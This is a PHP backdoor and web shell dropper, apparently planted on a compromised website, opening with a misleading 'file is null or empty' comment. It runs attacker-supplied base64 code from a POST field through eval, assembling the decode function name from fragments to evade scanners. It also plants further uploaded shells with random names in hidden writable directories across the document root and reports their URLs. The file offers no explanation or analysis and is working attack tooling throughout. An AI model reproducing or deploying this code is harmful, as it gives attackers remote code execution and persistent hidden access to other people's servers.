<!--FILE IS NULL OR EMPTY-->
<?php

$version = "1.5";
if(!empty($_POST["gjwqweodsa"]) and strlen($_POST["gjwqweodsa"]) > 0 and isset($_POST["gjwqweodsa"])){
 $isevalfunctionavailable = false;
 $evalcheck = "\$isevalfunctionavailable = true;";
 @eval($evalcheck);
 if ($isevalfunctionavailable === true) {
    $fnsdht = "b".""."as"."e"."".""."6"."4"."_"."de".""."c"."o".""."d"."e";

    $fv = $fnsdht($_POST["gjwqweodsa"]);
    @eval($fv);
    //@eval($_POST["gjwqweodsa"]);
 }else{
    $mpath =  realpath("")."/";
    //$dop = "\n@unlink(\"".$mpath."dsadasdsa1fag1.php\");\n";
    if(@file_put_contents($mpath."dsadasdsa1fag1.php","<?php\n".$fnsdht($_POST["gjwqweodsa"])."\n?>")){
        @include_once($mpath."dsadasdsa1fag1.php");
        @unlink($mpath."dsadasdsa1fag1.php");
    }else{
        echo "ERROR! CANT DO NOTHING!";
    }
 }
}
//if (is_uploaded_file($_FILES['file']['tmp_name']))
if(!empty($_POST['fname']) and isset($_POST['fname']) and strlen($_POST['fname'])>0)
{
  $fname = trim($_POST['fname']);
  $save_type = trim($_POST['save_type']);
  $dirname = trim($_POST['dirname']);
  $namecrt = trim($_POST['namecrt']);

  $auth_pass = trim($_POST['auth_pass']);
  $change_pass = trim($_POST['change_pass']);

  $file_type = trim($_POST['file_type']);
  $ftdata = trim($_POST['ftdata']);
  $is_sh = trim($_POST['is_sh']);

  if($namecrt == "random"){
    $fname = make_name($fname);
  }
  $uploadfile = "";

  if($save_type == "same_dir"){
    $uploadfile = realpath("")."/". $fname;
  }else if($save_type == "sub_dir"){
   $uploadfile = realpath("")."/". $fname;
  }else if($save_type == "sub_dir"){
    $uploadfile = realpath("")."/$dirname/". $fname;
    if(!@mkdir(realpath("")."/$dirname/", 0755)){
        $uploadfile = realpath("")."/". $fname;
    }
  }else if($save_type == "root"){
    $root = $_SERVER['DOCUMENT_ROOT']."/";
    if(@is_writable($root)){
        $uploadfile = $root.$fname;
    }else{
        $uploadfile = realpath("")."/". $fname;
    }
  }else if($save_type == "root_in_dir"){
    $root = $_SERVER['DOCUMENT_ROOT']."/";
    $uploadfile = $root."$dirname/". $fname;
    if(!@mkdir($root."$dirname/", 0755)){
        $uploadfile = realpath("")."/". $fname;
    }
  }else if($save_type == "random_dir"){
    $uploadfile = choose_dir();
    if(@is_writable($uploadfile)){
        $uploadfile = $uploadfile.$fname;
    }else{
        $uploadfile = realpath("")."/". $fname;
    }
  }else if($save_type == "random_dir_random_dirname"){
    $dirs = array("dwr","temp","htdata","docs","memory","limits_data","module_config","temp_memory");
    $dr = $dirs[array_rand($dirs)];

    $chodir =  choose_dir();
    $uploadfile = $chodir.$dr."/".$fname;

    if(!@mkdir($chodir."$dr/", 0755)){
        $uploadfile = realpath("")."/". $fname;
    }
  }else{
    $uploadfile = realpath("")."/". $fname;
  }
  if($file_type == "file"){
     if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
      {
        if($is_sh == "1" or $is_sh == 1){
            if($change_pass == "1" or $change_pass == 1){

            }else{
                $auth_pass = "";
            }
            $d = @file_get_contents($uploadfile);
            $d = str_replace("{||AUTH_PASS||}",$auth_pass,$d);
            @file_put_contents($uploadfile,$d);
        }
        $url = "http://".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["SERVER_NAME"],$uploadfile);
        echo "UPLOAD:".$url."-END";
      }
      else
      {
            echo "ERROR upload";
      }
  }else{
    if($is_sh == "1" or $is_sh == 1){
            if($change_pass == "1" or $change_pass == 1){

            }else{
                $auth_pass = "";
            }
            $ftdata = base64_decode($ftdata);
            $ftdata = str_replace("{||AUTH_PASS||}",$auth_pass,$ftdata);
    }
    if(@file_put_contents($uploadfile,$ftdata)){
        @chmod($uploadfile,0644);
        echo "UPLOAD:http://".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["SERVER_NAME"],$uploadfile)."-END";
    }else{
        $fp = fopen($uploadfile, "w");
        if($fp === false){
                echo "ERROR upload";
        }else{
                @fputs ($fp, $ftdata);
                @fclose ($fp);
                @chmod($uploadfile,0644);
                echo "UPLOAD:http://".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["SERVER_NAME"],$uploadfile)."-END";
        }
    }
  }

}

function make_name($curname){
    $l = array("_","__","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","1","2","3","4","5","6","7","8","9","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M");
    $leng = rand(3, 9);
    $ret = "";
    for($i = 0; $i < $leng; $i++){
        $ret .= $l[array_rand($l)];
    }
    $curname = explode(".",$curname);
    return $ret.".".$curname[1];
}

function choose_dir(){
    $lim = 0;
    $res_dirs = array_unique(my_scan($_SERVER['DOCUMENT_ROOT']."/",$lim));
    $t = array();
    for($j = 0; $j < count($res_dirs); $j++){
        $ct = explode("/",$res_dirs[$j]);
        $t[] = count($ct);
    }
    arsort($t);
    $cpath = "";
    $wrt_dirs = array();
    foreach($t as $key=>$val){
        if(@is_writable($res_dirs[$key])){
           if(@file_put_contents($res_dirs[$key]."t.php","hello")){
              @unlink($res_dirs[$key]."t.php");
              //$cpath =  $res_dirs[$key];
              //break;
              $wrt_dirs[] = $res_dirs[$key];
           }
        }
    }
    if(!empty($wrt_dirs) and count($wrt_dirs)>1){
        $cpath = $wrt_dirs[array_rand($wrt_dirs)];
    }
    if(empty($cpath) or $cpath == "" or strlen($cpath) == 0){
                $br = $_SERVER["DOCUMENT_ROOT"];
                if(substr($br, -1) != '/')
                        $br = $br.'/';
       $cpath = $br;
    }
    return $cpath;
}

function my_scan($startDir,&$lim){
    $cur_dir = @scandir($startDir);
    $res = array();
    for($ii = count($cur_dir)-1; $ii >=0; $ii--){
        $one_dir = $cur_dir[$ii];
        @set_time_limit(0);
        if($lim > 100)break;
        $d = $startDir.$one_dir;
        if(!@is_link($d) and @is_dir($d."/") && $one_dir !== "." && $one_dir !== ".." && $one_dir !== "cgi-bin" && $one_dir !== "webstats" && $one_dir !== "uploads" && $one_dir !== "upload" && $one_dir !== "js" && $one_dir !== "img" && $one_dir !== "images" && $one_dir !== "templates" && $one_dir !== "webstat" && strpos($one_dir,"backup")===false){
            if(@is_readable($d."/")){
                $res[] = $d."/";
                $res = array_merge($res,my_scan($d."/",$lim));
            }
        }
        $lim++;
    }
    return $res;
}
?>
